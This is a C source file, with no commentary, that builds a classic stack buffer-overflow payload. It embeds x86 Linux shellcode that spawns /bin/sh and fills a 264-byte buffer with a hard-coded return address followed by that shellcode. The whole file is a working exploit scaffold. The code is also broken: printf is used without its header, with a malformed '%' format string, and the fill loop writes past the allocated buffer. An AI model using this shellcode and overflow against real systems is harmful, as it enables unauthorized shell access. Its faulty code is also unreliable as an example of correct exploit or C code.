#include <stdlib.h>
#include <string.h>

#define shellcode "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

int main(void) {
	char *buff, *ptr;
	long *adr_ptr;
	int i;
	buff = malloc(264);
	ptr = buff;
	adr_ptr = (long *)ptr;
	for (i = 0; i < 264 + strlen(shellcode); i += 4)
		* (adr_ptr++) = 0x080483e8;
	ptr = buff + 264;
	for (i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	buff[264 + strlen(shellcode)] = '\0';
	printf("%", buff);
}